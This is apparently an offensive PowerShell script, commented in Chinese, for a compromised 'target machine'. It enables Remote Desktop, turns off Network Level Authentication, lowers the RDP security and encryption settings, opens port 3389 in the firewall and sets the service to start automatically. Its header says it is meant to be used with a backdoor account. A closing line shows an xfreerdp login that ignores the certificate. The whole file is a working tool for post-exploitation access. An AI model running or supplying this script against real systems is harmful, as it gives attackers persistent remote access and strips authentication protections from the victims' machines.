# rdp_enable.ps1 —— 开启远程桌面并关闭 NLA（口令可直连）
# 用途：为靶机开一条图形化管理通道；配合后门账号可直接 mstsc / xfreerdp 登录
param([switch]$Revert)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')) {
    Write-Host '[!] 需要管理员权限'; exit 1
}
$ts = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
$rdp = "$ts\WinStations\RDP-Tcp"

if ($Revert) {
    Set-ItemProperty $ts  fDenyTSConnections 1
    Set-ItemProperty $rdp UserAuthentication 1
    Set-ItemProperty $rdp SecurityLayer 1
    Remove-NetFirewallRule -DisplayName 'X-RDP-3389' -ErrorAction SilentlyContinue
    Write-Host '[+] RDP 已关闭并恢复 NLA'
    return
}

Set-ItemProperty $ts  fDenyTSConnections 0
Set-ItemProperty $rdp UserAuthentication 0   # 关 NLA
Set-ItemProperty $rdp SecurityLayer 0        # RDP 安全层(0=协商,便于工具连)
Set-ItemProperty $rdp MinEncryptionLevel 1
New-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' fAllowUnlisted 1 -PropertyType DWord -Force | Out-Null
Remove-NetFirewallRule -DisplayName 'X-RDP-3389' -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName 'X-RDP-3389' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 | Out-Null
Enable-NetFirewallRule -Group 'remote desktop' -ErrorAction SilentlyContinue
Start-Service TermService; Set-Service TermService -StartupType Automatic
Write-Host '[+] RDP 已开启: 3389 放行, NLA 关闭, TermService 自启'
Write-Host '[i] 连接: xfreerdp /v:<IP> /u:<user> /p:<pass> /cert:ignore'
